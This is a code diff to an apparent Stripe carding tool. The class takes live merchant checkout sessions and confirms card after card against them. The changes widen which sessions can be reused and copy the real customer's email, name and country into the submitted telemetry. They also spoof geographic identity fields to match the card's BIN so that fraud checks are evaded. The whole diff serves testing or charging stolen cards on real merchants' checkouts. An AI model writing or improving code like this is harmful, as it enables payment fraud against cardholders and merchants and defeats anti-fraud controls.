@@ -37,6 +37,9 @@ class CsHitSession:
         self.currency = ""
         self.checksum = ""
         self.confirms = 0
+        self.customer_email = ""
+        self.customer_name = ""
+        self.customer_country = ""
 
     async def open(self) -> tuple[bool, str]:
         d = stripe_fid.decode_fragment(self.url)
@@ -58,28 +61,45 @@ class CsHitSession:
             if data.get("is_sandbox_merchant") or not data.get("livemode", True):
                 await s.close()
                 return False, "TEST_MODE (sandbox-мерчант)"
+            
+            # Проверяем статус сессии: если она уже завершена (complete/expired) — выходим
+            sess_status = data.get("status")
+            if sess_status in ("complete", "expired"):
+                await s.close()
+                return False, f"сессия чекаута уже {sess_status}"
+
             pi = data.get("payment_intent") or {}
             self.secret = str(pi.get("client_secret") or "")
             self.pi_id = str(pi.get("id") or "")
             self.amount = int(pi.get("amount") or 0)
             self.currency = str(pi.get("currency") or "").upper()
             self.checksum = str(data.get("init_checksum") or "")
+
+            cust = data.get("customer") or {}
+            self.customer_email = str(data.get("customer_email") or cust.get("email") or "")
+            self.customer_name = str(cust.get("name") or "")
+            self.customer_country = str((cust.get("address") or {}).get("country") or (data.get("tax_context") or {}).get("customer_tax_country") or "")
+
             status = pi.get("status")
-            if status and status != "requires_payment_method":
+            # Разрешаем requires_payment_method И requires_action (Stripe позволяет перезаписывать незавершенный 3DS новой картой)
+            if status and status not in ("requires_payment_method", "requires_action"):
                 await s.close()
                 return False, f"PI status={status} — сессия не переиспользуется"
+
             if not self.secret and status:
-                await s.close()
-                return False, f"client_secret недоступен (сессия {data.get('status')}/{status})"
-            if not status:
-                # подписочные сессии: PI создаётся только при confirm,
-                # сумма известна из total_summary.due (скидки учтены)
-                due = ((data.get("total_summary") or {}).get("due"))
-                if not due:
+                # В подписочных сессиях client_secret может отсутствовать до confirm
+                pass
+
+            if not status or self.amount == 0:
+                # подписочные сессии: PI создаётся только при confirm или сумма в total_summary/invoice
+                due = ((data.get("total_summary") or {}).get("due")) or ((data.get("invoice") or {}).get("amount_due"))
+                if not due and not self.amount:
                     await s.close()
                     return False, "PI скрыт и сумма неизвестна (нестандартная сессия)"
-                self.amount = int(due)
-                self.currency = str(data.get("currency") or "").upper() or "USD"
+                if due:
+                    self.amount = int(due)
+                self.currency = str(data.get("currency") or (data.get("invoice") or {}).get("currency") or "").upper() or "USD"
+
             if self.amount > self.max_amount:
                 await s.close()
                 return False, f"CHARGE_RISK: {self.amount}{self.currency} > {self.max_amount}c"
@@ -90,15 +110,21 @@ class CsHitSession:
             return False, f"{type(e).__name__}: {e}"
 
     async def _alive(self) -> bool:
-        """PI ещё в requires_payment_method -> можно бить следующую карту."""
+        """Проверяем, жива ли сессия (requires_payment_method / requires_action или session open)."""
         try:
             r = await self.s.get(f"https://api.stripe.com/v1/payment_pages/{self.cs}",
                                  params={"key": self.pk},
                                  headers={"Origin": "https://js.stripe.com",
                                           "Referer": "https://js.stripe.com/",
                                           "Accept": "application/json"}, timeout=12)
-            pi = (r.json() or {}).get("payment_intent") or {}
-            return pi.get("status") == "requires_payment_method"
+            data = r.json() or {}
+            if data.get("status") in ("complete", "expired"):
+                return False
+            pi = data.get("payment_intent") or {}
+            st = pi.get("status")
+            if st:
+                return st in ("requires_payment_method", "requires_action")
+            return data.get("status") == "open"
         except Exception:
             return False
 
@@ -108,7 +134,13 @@ class CsHitSession:
         if self.confirms >= config.MAX_CONFIRMS_PER_SECRET and not await self._alive():
             return {"status": "ERROR", "detail": "confirm-бюджет исчерпан, PI не жив"}
         telem = gc.stripe_telemetry(self.url, self.pk)
-        if bin_alpha2 and bin_alpha2.upper() != (telem.get("country") or "US").upper():
+        if self.customer_email:
+            telem["email"] = self.customer_email
+        if self.customer_name:
+            telem["name"] = self.customer_name
+        if self.customer_country and not bin_alpha2:
+            telem.update(gc.geo_identity_fields(self.customer_country))
+        elif bin_alpha2 and bin_alpha2.upper() != (telem.get("country") or "US").upper():
             telem.update(gc.geo_identity_fields(bin_alpha2))
         card = gc.parse_card(card_raw)
         try:
@@ -154,10 +186,12 @@ class CsHitSession:
                                       headers={"Origin": "https://js.stripe.com",
                                                "Referer": "https://js.stripe.com/",
                                                "Accept": "application/json"}, timeout=12)
-                pi0 = (rg.json() or {}).get("payment_intent") or {}
-                if pi0.get("amount") and pi0.get("amount") != self.amount:
-                    self.amount = int(pi0["amount"])
-                    self.currency = str(pi0.get("currency") or self.currency).upper()
+                data0 = rg.json() or {}
+                pi0 = data0.get("payment_intent") or {}
+                new_amt = pi0.get("amount") or ((data0.get("total_summary") or {}).get("due")) or ((data0.get("invoice") or {}).get("amount_due"))
+                if new_amt and int(new_amt) != self.amount:
+                    self.amount = int(new_amt)
+                    self.currency = str(pi0.get("currency") or data0.get("currency") or self.currency).upper()
                     body["expected_amount"] = str(self.amount)
                     body["eid"] = str(uuid.uuid4())
                     body["payment_method"] = td["id"]
